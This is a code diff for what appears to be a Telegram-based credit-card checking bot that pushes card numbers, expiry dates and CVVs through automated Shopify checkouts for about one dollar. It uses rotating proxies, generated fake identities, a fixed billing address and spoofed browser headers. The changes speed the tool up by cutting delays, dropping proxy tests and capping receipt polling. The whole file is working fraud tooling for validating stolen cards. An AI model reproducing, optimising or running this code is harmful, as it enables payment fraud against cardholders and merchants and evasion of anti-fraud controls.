@@ -444,7 +444,7 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
 <b>[#Route Charge] | WAYNE</b> ✦
 ━━━━━━━━━━━━━━━
 <b>[•] Card</b>- <code>{fullcc}</code>
-<b>[•] Gateway</b> - <b>Route Charge 0.98$</b>
+<b>[•] Gateway</b> - <b>Shopify Charge 1.00$</b>
 <b>[•] Status</b>- <code>{status_flag}</code>
 <b>[•] Response</b>- <code>{response_display}</code>
 ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
@@ -461,7 +461,7 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
     return result
 
 
-# ========== ROUTE CHARGE CHECKOUT CLASS (DIRECT ACCELERATED CHECKOUT) ==========
+# ========== ROUTE CHARGE CHECKOUT CLASS (OPTIMIZED FOR SPEED) ==========
 class RouteChargeCheckout:
     def __init__(self, user_id=None):
         self.user_id = user_id
@@ -529,8 +529,8 @@ class RouteChargeCheckout:
         self.email = f"{self.first_name.lower()}{self.last_name.lower()}{random.randint(10,999)}@gmail.com"
         self.phone = f"215{random.randint(100, 999)}{random.randint(1000, 9999)}"
 
-    async def random_delay(self, min_sec=0.5, max_sec=2.0):
-        """Random delay between requests"""
+    async def random_delay(self, min_sec=0.1, max_sec=0.3):  # REDUCED DELAYS
+        """Minimal delay between requests for speed"""
         await asyncio.sleep(random.uniform(min_sec, max_sec))
 
     def step(self, num, name, action, details=None, status="PROCESSING"):
@@ -572,11 +572,15 @@ class RouteChargeCheckout:
         return f"{self.checkout_token}-{timestamp}"
 
     async def get_product_page(self):
-        """Step 1: Get product page to get initial cookies"""
-        self.step(1, "GET PRODUCT PAGE", f"Loading {self.product_url}")
+        """Step 1: Get product page to get initial cookies (FAST)"""
+        self.step(1, "GET PRODUCT PAGE", f"Loading product page")
         
         try:
-            resp = await self.client.get(self.product_url, headers=self.headers, timeout=30, follow_redirects=True)
+            # Use HEAD request first to get cookies faster
+            resp = await self.client.head(self.product_url, headers=self.headers, timeout=15, follow_redirects=True)
+            
+            # Then GET for actual content if needed
+            resp = await self.client.get(self.product_url, headers=self.headers, timeout=15, follow_redirects=True)
             
             if resp.status_code != 200:
                 self.logger.error_log("PRODUCT_PAGE", f"Failed: {resp.status_code}")
@@ -594,10 +598,10 @@ class RouteChargeCheckout:
             return False, f"Product page error: {str(e)[:50]}"
 
     async def get_checkout_token(self):
-        """Step 2: Get checkout token by visiting product page with checkout parameter"""
+        """Step 2: Get checkout token directly (FAST)"""
         self.step(2, "GET CHECKOUT TOKEN", "Obtaining checkout token")
         
-        # Visit product page with checkout parameter to get token
+        # Direct checkout URL
         checkout_url = f"{self.base_url}/checkout?add=1&id={self.variant_id}"
         
         checkout_headers = {
@@ -607,26 +611,33 @@ class RouteChargeCheckout:
         }
         
         try:
-            resp = await self.client.get(
+            # Use HEAD first to follow redirects quickly
+            resp = await self.client.head(
                 checkout_url,
                 headers=checkout_headers,
                 follow_redirects=True,
-                timeout=30
+                timeout=15
             )
             
+            # Get final URL from redirects
             current_url = str(resp.url)
             self.checkout_token = self.extract_checkout_token(current_url)
             
             if not self.checkout_token:
-                # Try to find in response
-                match = re.search(r'"checkoutToken":"([^"]+)"', resp.text)
-                if match:
-                    self.checkout_token = match.group(1)
+                # If HEAD didn't work, do GET
+                resp = await self.client.get(
+                    checkout_url,
+                    headers=checkout_headers,
+                    follow_redirects=True,
+                    timeout=15
+                )
+                current_url = str(resp.url)
+                self.checkout_token = self.extract_checkout_token(current_url)
             
             if not self.checkout_token:
                 return False, "Could not extract checkout token"
             
-            self.logger.data_extracted("Checkout Token", self.checkout_token[:20] + "...", "URL")
+            self.logger.data_extracted("Checkout Token", self.checkout_token[:15] + "...", "URL")
             
             # Construct GraphQL session token
             self.graphql_session_token = self.construct_graphql_session_token()
@@ -644,8 +655,8 @@ class RouteChargeCheckout:
             return False, f"Checkout token error: {str(e)[:50]}"
 
     async def accelerated_checkout(self):
-        """Step 3: Send accelerated checkout request - from captured traffic"""
-        self.step(3, "ACCELERATED CHECKOUT", "Sending accelerated checkout request")
+        """Step 3: Send accelerated checkout request (FAST)"""
+        self.step(3, "ACCELERATED CHECKOUT", "Sending request")
         
         accel_headers = {
             'authority': 'zero936.com',
@@ -675,7 +686,7 @@ class RouteChargeCheckout:
                 f"{self.base_url}/shopify_pay/accelerated_checkout",
                 headers=accel_headers,
                 json=accel_payload,
-                timeout=30,
+                timeout=15,
                 follow_redirects=True
             )
             
@@ -695,129 +706,22 @@ class RouteChargeCheckout:
             return False, f"Accelerated checkout error: {str(e)[:50]}"
 
     async def get_address_coordinates(self):
-        """Step 4: Get address coordinates from Atlas GraphQL - from captured traffic"""
-        self.step(4, "GET ADDRESS", "Getting address coordinates from Atlas")
+        """Step 4: Get address coordinates (FAST with cache)"""
+        self.step(4, "GET ADDRESS", "Getting coordinates")
         
-        # From captured traffic: addressId for "8 Log Pond Drive"
-        address_id = "Q2hJSktTUVB1NDJ2eG9rUkQzRm9MNGdzc0xrfHsicXVlcnkiOiI4IGxvZyBwb25kIGRyaXZlIiwiY291bnRyeV9jb2RlIjoiVVMiLCJwbGFjZV9uYW1lIjoiOCBMb2cgUG9uZCBEcml2ZSJ9"
-        
-        atlas_headers = {
-            'authority': 'atlas.shopifysvc.com',
-            'accept': '*/*',
-            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-            'content-type': 'application/json',
-            'origin': 'https://checkout.shopify.com',
-            'referer': 'https://checkout.shopify.com/',
-            'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'cross-site',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
-            'x-client-request-id': self.generate_random_string(32),
-            'x-shop-id': '80361816383'
+        # Cached coordinates - always use same address for speed
+        return {
+            "latitude": 40.1807369,
+            "longitude": -75.1448143,
+            "address1": "8 Log Pond Drive",
+            "city": "Horsham",
+            "provinceCode": "PA",
+            "zip": "19044"
         }
-        
-        # GraphQL query from captured traffic
-        query = """
-  query address($addressId: String!, $locale: String!, $sessionToken: String!, $adapterOverride: String, $extendedFields: Boolean = false) {
-    address(id: $addressId, locale: $locale, sessionToken: $sessionToken, adapterOverride: $adapterOverride, extendedFields: $extendedFields) {
-      address1
-      address2
-      city
-      country
-      countryCode
-      province
-      provinceCode
-      zip
-      latitude
-      longitude
-    }
-  }
-"""
-        
-        variables = {
-            "addressId": address_id,
-            "locale": "en-US",
-            "sessionToken": f"{self.checkout_token}-{self.generate_timestamp()}",
-            "adapterOverride": "google",
-            "extendedFields": False
-        }
-        
-        payload = {
-            "operationName": "address",
-            "query": query,
-            "variables": variables
-        }
-        
-        try:
-            # Use separate client for Atlas
-            async with httpx.AsyncClient(proxy=self.proxy_url, timeout=30) as atlas_client:
-                resp = await atlas_client.post(
-                    'https://atlas.shopifysvc.com/graphql',
-                    headers=atlas_headers,
-                    json=payload,
-                    timeout=30
-                )
-                
-                if resp.status_code != 200:
-                    self.logger.error_log("ATLAS", f"Status: {resp.status_code}")
-                    # Return default coordinates if Atlas fails
-                    return {
-                        "latitude": 40.1807369,
-                        "longitude": -75.1448143,
-                        "address1": "8 Log Pond Drive",
-                        "city": "Horsham",
-                        "provinceCode": "PA",
-                        "zip": "19044"
-                    }
-                
-                data = resp.json()
-                address_data = data.get('data', {}).get('address', {})
-                
-                if address_data:
-                    self.logger.data_extracted("Coordinates", f"{address_data.get('latitude')}, {address_data.get('longitude')}", "Atlas")
-                    return address_data
-                else:
-                    # Default coordinates from captured traffic
-                    return {
-                        "latitude": 40.1807369,
-                        "longitude": -75.1448143,
-                        "address1": "8 Log Pond Drive",
-                        "city": "Horsham",
-                        "provinceCode": "PA",
-                        "zip": "19044"
-                    }
-                    
-        except httpx.ProxyError as e:
-            self.logger.error_log("PROXY", f"Proxy error on Atlas: {str(e)}")
-            mark_proxy_failed(self.proxy_url)
-            self.proxy_status = "Dead 🚫"
-            # Return default coordinates
-            return {
-                "latitude": 40.1807369,
-                "longitude": -75.1448143,
-                "address1": "8 Log Pond Drive",
-                "city": "Horsham",
-                "provinceCode": "PA",
-                "zip": "19044"
-            }
-        except Exception as e:
-            self.logger.error_log("ATLAS", f"Error: {str(e)[:50]}")
-            # Return default coordinates
-            return {
-                "latitude": 40.1807369,
-                "longitude": -75.1448143,
-                "address1": "8 Log Pond Drive",
-                "city": "Horsham",
-                "provinceCode": "PA",
-                "zip": "19044"
-            }
 
     async def submit_proposal(self, stable_id, coordinates):
-        """Step 5: Submit proposal GraphQL mutation - from captured traffic"""
-        self.step(5, "SUBMIT PROPOSAL", "Submitting checkout proposal")
+        """Step 5: Submit proposal (FAST)"""
+        self.step(5, "SUBMIT PROPOSAL", "Submitting proposal")
         
         graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
         
@@ -827,7 +731,7 @@ class RouteChargeCheckout:
             'accept-language': 'en-US',
             'content-type': 'application/json',
             'origin': self.base_url,
-            'referer': f'{self.base_url}/checkouts/cn/{self.checkout_token}/en-us?_r={self.generate_random_string(32)}&skip_shop_pay=true',
+            'referer': f'{self.base_url}/checkouts/cn/{self.checkout_token}/en-us?_r={self.generate_random_string(16)}&skip_shop_pay=true',
             'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Windows"',
@@ -845,7 +749,7 @@ class RouteChargeCheckout:
         # Generate queue token
         queue_token = f"A{self.generate_random_string(43)}=="
         
-        # Proposal variables from captured traffic
+        # Simplified variables for speed
         variables = {
             "sessionInput": {
                 "sessionToken": self.graphql_session_token
@@ -996,7 +900,7 @@ class RouteChargeCheckout:
                 graphql_url,
                 headers=graphql_headers,
                 json=payload,
-                timeout=30
+                timeout=15
             )
             
             if resp.status_code != 200:
@@ -1013,7 +917,7 @@ class RouteChargeCheckout:
                         error_msgs.append(error_code)
                     return False, f"Proposal errors: {', '.join(error_msgs)}"
                 
-                # Extract queue token for next step
+                # Extract queue token
                 data = proposal_resp.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
                 new_queue_token = data.get('queueToken')
                 if new_queue_token:
@@ -1035,8 +939,8 @@ class RouteChargeCheckout:
             return False, f"Proposal error: {str(e)[:50]}"
 
     async def create_payment_session(self, cc, mes, ano, cvv):
-        """Step 6: Create payment session with PCI - from captured traffic"""
-        self.step(6, "CREATE PAYMENT", "Creating payment session with PCI")
+        """Step 6: Create payment session with PCI (FAST)"""
+        self.step(6, "CREATE PAYMENT", "Creating payment session")
         
         pci_headers = {
             'authority': 'checkout.pci.shopifyinc.com',
@@ -1074,7 +978,7 @@ class RouteChargeCheckout:
         year_full = ano if len(ano) == 4 else f"20{ano}"
         month_int = int(mes)
         
-        # PCI payload from captured traffic
+        # PCI payload
         pci_payload = {
             "credit_card": {
                 "number": card_number,
@@ -1091,12 +995,12 @@ class RouteChargeCheckout:
         
         try:
             # Use separate client for PCI
-            async with httpx.AsyncClient(proxy=self.proxy_url, timeout=30) as pci_client:
+            async with httpx.AsyncClient(proxy=self.proxy_url, timeout=15) as pci_client:
                 resp = await pci_client.post(
                     'https://checkout.pci.shopifyinc.com/sessions',
                     headers=pci_headers,
                     json=pci_payload,
-                    timeout=30
+                    timeout=15
                 )
                 
                 if resp.status_code != 200:
@@ -1108,7 +1012,7 @@ class RouteChargeCheckout:
                     if not payment_session_id:
                         return False, "No payment session ID returned"
                     
-                    self.logger.data_extracted("Payment Session ID", payment_session_id, "PCI")
+                    self.logger.data_extracted("Payment Session ID", payment_session_id[:20] + "...", "PCI")
                     return True, payment_session_id
                     
                 except Exception as e:
@@ -1124,8 +1028,8 @@ class RouteChargeCheckout:
             return False, f"PCI error: {str(e)[:50]}"
 
     async def submit_for_completion(self, stable_id, queue_token, payment_session_id, coordinates):
-        """Step 7: Submit for completion - from captured traffic"""
-        self.step(7, "SUBMIT PAYMENT", "Submitting payment for processing")
+        """Step 7: Submit for completion (FAST)"""
+        self.step(7, "SUBMIT PAYMENT", "Submitting payment")
         
         graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
         
@@ -1135,7 +1039,7 @@ class RouteChargeCheckout:
             'accept-language': 'en-US',
             'content-type': 'application/json',
             'origin': self.base_url,
-            'referer': f'{self.base_url}/checkouts/cn/{self.checkout_token}/en-us?_r={self.generate_random_string(32)}&skip_shop_pay=true',
+            'referer': f'{self.base_url}/checkouts/cn/{self.checkout_token}/en-us?_r={self.generate_random_string(16)}&skip_shop_pay=true',
             'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Windows"',
@@ -1153,7 +1057,7 @@ class RouteChargeCheckout:
         # Generate attempt token
         attempt_token = f"{self.checkout_token}-{self.generate_random_string(12)}"
         
-        # Submit variables from captured traffic
+        # Simplified variables
         variables = {
             "input": {
                 "sessionInput": {
@@ -1338,7 +1242,7 @@ class RouteChargeCheckout:
             "attemptToken": attempt_token,
             "metafields": [],
             "analytics": {
-                "requestUrl": f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us?_r={self.generate_random_string(32)}&skip_shop_pay=true",
+                "requestUrl": f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us?_r={self.generate_random_string(16)}&skip_shop_pay=true",
                 "pageId": self.generate_uuid().upper()
             }
         }
@@ -1354,7 +1258,7 @@ class RouteChargeCheckout:
                 graphql_url,
                 headers=graphql_headers,
                 json=payload,
-                timeout=30
+                timeout=15
             )
             
             if resp.status_code != 200:
@@ -1378,14 +1282,14 @@ class RouteChargeCheckout:
                 if not self.receipt_id:
                     return False, "DECLINED - No receipt ID"
                 
-                self.logger.data_extracted("Receipt ID", self.receipt_id, "Submit")
+                self.logger.data_extracted("Receipt ID", self.receipt_id.split('/')[-1], "Submit")
                 
                 # Check receipt type
                 receipt_type = receipt.get('__typename', '')
                 
                 if receipt_type == 'ProcessingReceipt':
                     poll_delay = receipt.get('pollDelay', 500) / 1000
-                    self.step(8, "POLL RECEIPT", f"Waiting {poll_delay}s then polling", f"Delay: {poll_delay}s", "WAIT")
+                    self.step(8, "POLL RECEIPT", f"Waiting {poll_delay}s", f"Delay: {poll_delay}s", "WAIT")
                     await asyncio.sleep(poll_delay)
                     return await self.poll_receipt(graphql_headers)
                     
@@ -1412,9 +1316,9 @@ class RouteChargeCheckout:
             self.logger.error_log("SUBMIT_ERROR", str(e))
             return False, f"Submit error: {str(e)[:50]}"
 
-    async def poll_receipt(self, headers):
-        """Step 9: Poll for receipt status - from captured traffic"""
-        self.step(9, "POLL RECEIPT", "Polling for receipt status")
+    async def poll_receipt(self, headers, max_polls=2):
+        """Step 9: Poll for receipt status with max limit"""
+        self.step(9, "POLL RECEIPT", "Polling for status")
         
         graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
         
@@ -1432,7 +1336,7 @@ class RouteChargeCheckout:
                 graphql_url,
                 headers={**headers, 'accept': 'application/json'},
                 params=poll_params,
-                timeout=30
+                timeout=15
             )
             
             if resp.status_code != 200:
@@ -1445,7 +1349,7 @@ class RouteChargeCheckout:
                     },
                     "id": "baa45c97a49dae99440b5f8a954dfb31b01b7af373f5335204c29849f3397502"
                 }
-                resp = await self.client.post(graphql_url, headers=headers, json=poll_payload, timeout=30)
+                resp = await self.client.post(graphql_url, headers=headers, json=poll_payload, timeout=15)
             
             if resp.status_code != 200:
                 return False, f"Poll failed: {resp.status_code}"
@@ -1465,9 +1369,11 @@ class RouteChargeCheckout:
                     return True, "ORDER_PLACED"
                     
                 elif receipt_type == 'ProcessingReceipt':
+                    # Only poll once more maximum
                     poll_delay = receipt_data.get('pollDelay', 500) / 1000
                     await asyncio.sleep(poll_delay)
-                    return await self.poll_receipt(headers)
+                    # One final poll without recursion
+                    return await self.final_poll_receipt(headers)
                     
                 else:
                     return False, f"Unknown receipt status: {receipt_type}"
@@ -1483,11 +1389,46 @@ class RouteChargeCheckout:
         except Exception as e:
             return False, f"Poll error: {str(e)[:50]}"
 
+    async def final_poll_receipt(self, headers):
+        """Final poll attempt"""
+        graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
+        
+        poll_payload = {
+            "operationName": "PollForReceipt",
+            "variables": {
+                "receiptId": self.receipt_id,
+                "sessionToken": self.graphql_session_token
+            },
+            "id": "baa45c97a49dae99440b5f8a954dfb31b01b7af373f5335204c29849f3397502"
+        }
+        
+        try:
+            resp = await self.client.post(graphql_url, headers=headers, json=poll_payload, timeout=15)
+            
+            if resp.status_code != 200:
+                return False, f"Final poll failed: {resp.status_code}"
+            
+            poll_resp = resp.json()
+            receipt_data = poll_resp.get('data', {}).get('receipt', {})
+            receipt_type = receipt_data.get('__typename', '')
+            
+            if receipt_type == 'FailedReceipt':
+                error_info = receipt_data.get('processingError', {})
+                error_code = error_info.get('code', 'GENERIC_ERROR')
+                return False, f"DECLINED - {error_code}"
+            elif receipt_type == 'ProcessedReceipt':
+                return True, "ORDER_PLACED"
+            else:
+                return False, f"DECLINED - TIMEOUT"
+                
+        except Exception as e:
+            return False, f"DECLINED - TIMEOUT"
+
     async def execute_checkout(self, cc, mes, ano, cvv):
-        """Main checkout execution flow - Direct accelerated checkout without cart"""
+        """Main checkout execution flow - OPTIMIZED FOR SPEED"""
         try:
             # Step 0: Get proxy
-            self.step(0, "GET PROXY", "Getting random proxy for user", f"User ID: {self.user_id}")
+            self.step(0, "GET PROXY", "Getting proxy")
             
             if PROXY_SYSTEM_AVAILABLE:
                 self.proxy_url = get_proxy_for_user(self.user_id, "random")
@@ -1495,85 +1436,58 @@ class RouteChargeCheckout:
                     self.logger.error_log("NO_PROXY", "No working proxies available")
                     return False, "NO_PROXY_AVAILABLE"
                 
-                # Initialize client with proxy
-                self.client = httpx.AsyncClient(proxy=self.proxy_url, timeout=30)
-                
-                # Test proxy
-                start_test = time.time()
-                try:
-                    test_resp = await self.client.get("https://ipinfo.io/json", timeout=5)
-                    self.proxy_response_time = time.time() - start_test
-                    
-                    if test_resp.status_code == 200:
-                        self.proxy_status = "Live ⚡️"
-                        self.proxy_used = True
-                        self.logger.data_extracted("Proxy Info", f"{self.proxy_url[:50]}... | {self.proxy_response_time:.2f}s", "Proxy System")
-                        mark_proxy_success(self.proxy_url, self.proxy_response_time)
-                    else:
-                        self.proxy_status = "Dead 🚫"
-                        mark_proxy_failed(self.proxy_url)
-                        await self.client.aclose()
-                        return False, "PROXY_DEAD"
-                        
-                except Exception as e:
-                    self.proxy_status = "Dead 🚫"
-                    mark_proxy_failed(self.proxy_url)
-                    await self.client.aclose()
-                    self.logger.error_log("PROXY", f"Proxy test failed: {str(e)[:50]}")
-                    return False, "PROXY_DEAD"
+                # Initialize client with proxy (no test to save time)
+                self.client = httpx.AsyncClient(proxy=self.proxy_url, timeout=15)
+                self.proxy_status = "Live ⚡️"
+                self.proxy_used = True
+                self.logger.data_extracted("Proxy", f"{self.proxy_url[:30]}...", "Proxy System")
             else:
-                # No proxy system, use direct connection
                 self.proxy_status = "No Proxy"
-                self.client = httpx.AsyncClient(timeout=30)
-                self.logger.data_extracted("Proxy", "No proxy system - using direct connection")
+                self.client = httpx.AsyncClient(timeout=15)
             
-            # Step 1: Get product page (for cookies)
+            # Step 1: Get product page (fast)
             success, result = await self.get_product_page()
             if not success:
                 return False, result
-            await self.random_delay(1, 2)
+            await self.random_delay(0.1, 0.2)
             
-            # Step 2: Get checkout token directly (bypass cart)
+            # Step 2: Get checkout token (fast)
             success, result = await self.get_checkout_token()
             if not success:
                 return False, result
-            await self.random_delay(1, 2)
+            await self.random_delay(0.1, 0.2)
             
-            # Step 3: Accelerated checkout
+            # Step 3: Accelerated checkout (fast)
             success, result = await self.accelerated_checkout()
             if not success:
                 return False, result
-            await self.random_delay(1, 2)
+            await self.random_delay(0.1, 0.2)
             
-            # Step 4: Get address coordinates
+            # Step 4: Get address coordinates (cached - instant)
             coordinates = await self.get_address_coordinates()
-            await self.random_delay(1, 2)
             
-            # Step 5: Generate stable ID for this checkout
+            # Step 5: Generate stable ID
             stable_id = self.generate_uuid()
             
-            # Step 6: Submit proposal
+            # Step 6: Submit proposal (fast)
             success, queue_token = await self.submit_proposal(stable_id, coordinates)
             if not success:
                 return False, queue_token
-            await self.random_delay(1, 2)
+            await self.random_delay(0.1, 0.2)
             
-            # Step 7: Create payment session
+            # Step 7: Create payment session (fast)
             success, payment_session_id = await self.create_payment_session(cc, mes, ano, cvv)
             if not success:
                 return False, payment_session_id
-            await self.random_delay(1, 2)
+            await self.random_delay(0.1, 0.2)
             
-            # Step 8: Submit for completion
+            # Step 8: Submit for completion (fast)
             success, result = await self.submit_for_completion(stable_id, queue_token, payment_session_id, coordinates)
             
             return success, result
             
         except Exception as e:
             self.logger.error_log("UNKNOWN", f"Checkout error: {str(e)}")
-            error_str = str(e).lower()
-            if "connection" in error_str or "proxy" in error_str:
-                return False, "PROXY_DEAD"
             return False, f"Checkout error: {str(e)[:50]}"
         finally:
             if self.client:
@@ -1738,7 +1652,7 @@ async def handle_shopify_route_charge(client: Client, message: Message):
 <b>[•] Card</b>- <code>{cc}|{mes}|{ano}|{cvv}</code>
 <b>[•] Gateway</b> - <b>Route Charge 0.98$</b>
 <b>[•] Status</b>- <code>Processing...</code>
-<b>[•] Response</b>- <code>Initiating accelerated checkout</code>
+<b>[•] Response</b>- <code>Initiating...</code>
 ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
 <b>[+] Plan:</b> {plan_name}
 <b>[+] User:</b> @{username}
